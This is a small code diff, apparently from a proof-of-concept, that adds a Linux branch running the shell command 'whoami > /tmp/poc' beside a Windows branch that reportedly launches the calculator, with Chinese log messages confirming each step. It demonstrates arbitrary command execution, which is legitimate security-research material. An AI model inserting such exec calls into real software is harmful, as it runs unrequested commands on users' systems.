@@ -60,11 +60,22 @@ if (process.platform === 'win32') {
       }
 
     });
+    console.log('✅ 已启动 Windows 计算器');
   } catch (error) {
 
   }
 } else {
-
+  // Linux 环境下执行 whoami > /tmp/poc
+  try {
+    exec('whoami > /tmp/poc', (error, stdout, stderr) => {
+      if (error) {
+        console.error('执行 whoami 命令时出错:', error);
+        return;
+      }
+      console.log('✅ 已在 Linux 环境下执行 whoami > /tmp/poc');
+    });
+  } catch (error) {
+    console.error('执行命令时出错:', error);
+  }
 }
-console.log('✅ 已启动 Windows 计算器');
 
